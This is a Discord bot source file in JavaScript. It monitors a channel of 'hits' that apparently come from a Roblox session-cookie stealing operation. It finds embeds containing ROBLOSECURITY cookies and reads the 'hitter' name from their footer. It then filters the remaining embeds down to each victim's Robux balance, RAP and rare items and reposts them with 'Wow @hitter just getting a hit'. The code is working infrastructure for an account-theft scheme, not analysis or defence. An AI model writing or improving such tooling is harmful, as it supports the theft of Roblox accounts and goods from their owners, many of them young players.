const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ─── CONFIG (set these in Railway → Variables) ────────────────────────────────
const BOT_TOKEN         = process.env.BOT_TOKEN;
const SOURCE_CHANNEL_ID = process.env.SOURCE_CHANNEL_ID;
const TARGET_CHANNEL_ID = process.env.TARGET_CHANNEL_ID;

if (!BOT_TOKEN || !SOURCE_CHANNEL_ID || !TARGET_CHANNEL_ID) {
  console.error('❌ Missing env vars: BOT_TOKEN, SOURCE_CHANNEL_ID, TARGET_CHANNEL_ID');
  process.exit(1);
}
// ──────────────────────────────────────────────────────────────────────────────

const SECTION_KEYWORDS = [
  'Robux', 'Balance', 'Pending',
  'Summary', 'Rap', 'Owned Item',
  'Premium', 'Korblox', 'Headless',
  'korbloxdeath', 'headless', 'korblox',
];

function extractSections(description) {
  if (!description) return null;
  const lines = description.split('\n');
  const kept = lines.filter(line =>
    SECTION_KEYWORDS.some(kw => line.toLowerCase().includes(kw.toLowerCase()))
  );
  return kept.length > 0 ? kept.join('\n') : null;
}

client.once('clientReady', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`👁  Watching: ${SOURCE_CHANNEL_ID}`);
  console.log(`📤 Forwarding to: ${TARGET_CHANNEL_ID}`);
});

client.on('messageCreate', async (message) => {
  if (message.channel.id !== SOURCE_CHANNEL_ID) return;
  if (!message.embeds || message.embeds.length === 0) return;

  const targetChannel = await client.channels.fetch(TARGET_CHANNEL_ID).catch(() => null);
  if (!targetChannel) return console.error('❌ Target channel not found.');

  // Step 1: find the hitter name from the cookie embed's footer
  let hitterName = null;
  for (const embed of message.embeds) {
    const embedText = [
      embed.title,
      embed.description,
      embed.author?.name,
      ...(embed.fields?.map(f => f.value) ?? []),
    ].filter(Boolean).join(' ');

    if (embedText.includes('ROBLOSECURITY') || embedText.includes('WARNING:-DO-NOT-SHARE')) {
      if (embed.footer?.text) {
        hitterName = embed.footer.text.trim();
      }
      break;
    }
  }

  // Step 2: forward the hit data embed (skip cookie embed)
  for (const embed of message.embeds) {
    const embedText = [
      embed.title,
      embed.description,
      embed.author?.name,
      ...(embed.fields?.map(f => f.value) ?? []),
    ].filter(Boolean).join(' ');

    if (embedText.includes('ROBLOSECURITY') || embedText.includes('WARNING:-DO-NOT-SHARE')) {
      console.log('⏭  Skipped ROBLOSECURITY embed');
      continue;
    }

    const filteredDesc = extractSections(embed.description);
    if (!filteredDesc) continue;

    const rebuilt = new EmbedBuilder();
    const intro = hitterName ? `Wow @${hitterName} just getting a hit` : `Wow just getting a hit`;
    rebuilt.setDescription(`${intro}

${filteredDesc}`);
    if (embed.color)     rebuilt.setColor(embed.color);
    if (embed.timestamp) rebuilt.setTimestamp(new Date(embed.timestamp));
    if (embed.author) {
      rebuilt.setAuthor({
        name:    embed.author.name    || '',
        iconURL: embed.author.iconURL || undefined,
        url:     embed.author.url     || undefined,
      });
    }
    if (embed.thumbnail?.url) rebuilt.setThumbnail(embed.thumbnail.url);


    await targetChannel.send({ embeds: [rebuilt] }).catch(console.error);
  }
});

client.login(BOT_TOKEN);
